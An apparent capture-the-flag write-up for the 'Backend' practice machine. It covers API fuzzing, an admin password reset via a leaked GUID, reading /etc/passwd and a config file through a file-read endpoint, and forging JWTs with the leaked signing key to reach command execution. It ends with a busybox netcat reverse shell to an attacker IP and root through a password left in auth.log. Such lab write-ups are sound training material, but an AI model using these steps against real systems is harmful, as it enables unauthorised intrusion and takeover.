# Backend

Level: **Medium**

Description: This challenge is based on API, there is much recon to do about this machine so focus on it, the privilege escalation is easier than you think

---

# Recon

### PortScan

`nmap 10.10.11.161 -sC -sV`

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled.png)

## WEB

[http://backend.htb/](http://backend.htb/)

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled%201.png)

Lets fuzz this API 

`ffuf -u [http://backend.htb/FUZZ](http://backend.htb/FUZZ) -w /usr/share/wordlists/api/fullPath.txt`

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled%202.png)

[http://backend.htb/api/v1/admin/](http://backend.htb/api/v1/admin/)

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled%203.png)

Found admin information

[`http://backend.htb/api/v1/user/1`](http://backend.htb/api/v1/user/1)

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled%204.png)

`36c2e94a-4271-4259-93bf-c96ad5948284`

Using wfuzz

`wfuzz -u http://backend.htb/api/v1/user/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -X POST --hc 405`

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled%205.png)

Sending a curl request to signup endpoint

`curl [http://10.10.11.161/api/v1/user/signup](http://10.10.11.161/api/v1/user/signup) -X POST | jq .`

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled%206.png)

Note: set the Content Type to `json`

Make a empty json request

`curl http://10.10.11.161/api/v1/user/signup -X POST -d '{"":""}' -H "Content-Type: application/json" | jq .`

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled%207.png)

Now that we know it takes a email and password lets test it

`curl http://10.10.11.161/api/v1/user/signup -X POST -d '{"email":"test@test.com","password":"test"}' -H "Content-Type: application/json" | jq .`

We got no response so i think it was a valid query

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled%208.png)

**Login phase**

We found earlier the login endpoint when we do the next command it requires username and password

`curl http://10.10.11.161/api/v1/user/login -X POST -d '{"":""}' -H "Content-Type: application/json" | jq .`

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled%209.png)

Making that login requests it gives this error

`curl [http://10.10.11.161/api/v1/user/login](http://10.10.11.161/api/v1/user/login) -X POST -d '{"username":"test","password":"test"}' -H "Content-Type: application/json" | jq .`

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled%2010.png)

by making a normal request without `json` it worked

`curl [http://10.10.11.161/api/v1/user/login](http://10.10.11.161/api/v1/user/login) -d 'username=test@test.com&password=test' | jq .`

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled%2011.png)

### JWT Token

Using the [https://jwt.io](https://jwt.io/) we can decode and modify the token

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled%2012.png)

Login using our jwt token

`curl [http://10.10.11.161/docs](http://10.10.11.161/docs) -H "Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzA5OTk2NzU0LCJpYXQiOjE3MDkzMDU1NTQsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiYWM1NGE4MjMtOWJmZC00N2Y5LTk1OWQtMDQ4MDIwZjA3MWU1In0.r3uNoQ1YuKtTLn9nQ1ZHwU2t-bV25mxYkEznz5Z-cno"`

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled%2013.png)

This seems to be a normal website so i used burpsuite to make this request

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled%2014.png)

It will make a request to `/openapi.json` so don’t forget to put again the header

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled%2015.png)

### API schema

Now we get access to the entire API

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled%2016.png)

### User flag

Execute this simple function

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled%2017.png)

## Foot Hole

### Reset password

We found GUID earlier and now we can update admin’s password

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled%2018.png)

Login as admin

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled%2019.png)

Successfully logged in

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled%2020.png)

### Get File function

Read `/etc/passwd`

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled%2021.png)

Results

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled%2022.png)

Now filter the users from the file and we get `htb` user

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled%2023.png)

To get the webapp location look for `/proc/self/environ`

```sql
{
  "file": "APP_MODULE=app.main:app\u0000PWD=/home/htb/uhc\u0000LOGNAME=htb\u0000PORT=80\u0000HOME=/home/htb\u0000LANG=C.UTF-8\u0000VIRTUAL_ENV=/home/htb/uhc/.venv\u0000INVOCATION_ID=23d6fefd6f2e4b5aaf38b61387aa352b\u0000HOST=0.0.0.0\u0000USER=htb\u0000SHLVL=0\u0000PS1=(.venv) \u0000JOURNAL_STREAM=9:17870\u0000PATH=/home/htb/uhc/.venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000OLDPWD=/\u0000"
}
```

We can see that there is a `/home/htb/uhc/` directory and python applications usually are stored in `/home/htb/uhc/app/main.py`

After some time messing around found the `/home/htb/uhc/app/core/config.py` with jwt token secret

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled%2024.png)

`SuperSecretSigningKey-HTB`

`HS256`

Change the token using the secret

`python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzA5OTk2NzU0LCJpYXQiOjE3MDkzMDU1NTQsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiYWM1NGE4MjMtOWJmZC00N2Y5LTk1OWQtMDQ4MDIwZjA3MWU1In0.r3uNoQ1YuKtTLn9nQ1ZHwU2t-bV25mxYkEznz5Z-cno -S hs256 -p 'SuperSecretSigningKey-HTB' -T`

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled%2025.png)

Send a curl request

`curl -X 'GET' \
'[http://10.10.11.161/api/v1/admin/exec/id](http://10.10.11.161/api/v1/admin/exec/id)' \
-H 'accept: application/json' \
-H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzA5OTk2NzU0LCJpYXQiOjE3MDkzMDU1NTQsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.25WjhlERDoRpA7WZoMflgha75TMjENEEoNFJI9KLgas'`

When we try we get this error so lets fix it

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled%2026.png)

Make the same command but with the new key

`python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzA5OTk2NzU0LCJpYXQiOjE3MDkzMDU1NTQsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.25WjhlERDoRpA7WZoMflgha75TMjENEEoNFJI9KLgas -S hs256 -p 'SuperSecretSigningKey-HTB' -T`

Now we need to add the key `debug` and set it to `True`

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled%2027.png)

Now when run the same command with the new key we get the results of the command

`curl -X 'GET'   '[http://10.10.11.161/api/v1/admin/exec/id](http://10.10.11.161/api/v1/admin/exec/id)'   -H 'accept: application/json'   -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzA5OTk2NzU0LCJpYXQiOjE3MDkzMDU1NTQsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6dHJ1ZX0.7c-P9jhcFF-B-dsv0YZLZm4_YdhsgK9pMtbCHlt1QKQ'`

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled%2028.png)

### RCE

I used busybox to get the shell, the payload was

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled%2029.png)

Open a nc listener

`nc -lvnp 4444`

Then i just URL encode the payload and run it

`curl -X 'GET' 'http://10.10.11.161/api/v1/admin/exec/busybox nc 10.10.14.20 4444 -e sh' -H 'accept: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzA5OTk2NzU0LCJpYXQiOjE3MDkzMDU1NTQsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6dHJ1ZX0.7c-P9jhcFF-B-dsv0YZLZm4_YdhsgK9pMtbCHlt1QKQ'`

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled%2030.png)

## Privilege Escalation

Found new user/password at `auth.log`

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled%2031.png)

`su -` and use that password to login

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled%2032.png)

Root flag

![Untitled](Backend%20ff0d31201c34493aba5b9ca54b416ff2/Untitled%2033.png)
